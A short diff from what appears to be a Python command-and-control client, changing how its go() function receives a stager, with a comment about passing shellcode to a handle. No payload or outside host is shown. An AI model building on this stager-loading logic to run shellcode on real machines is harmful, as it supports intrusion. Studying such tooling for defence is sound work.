@@ -96,7 +96,7 @@ def task_decode(task):
 
 def go():
     print "Waiting for stager..."
-    p = recvData()
+    p = recvData(CLIENT_ID)
     print "Got a stager! loading..."
     sleep(2)
     # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
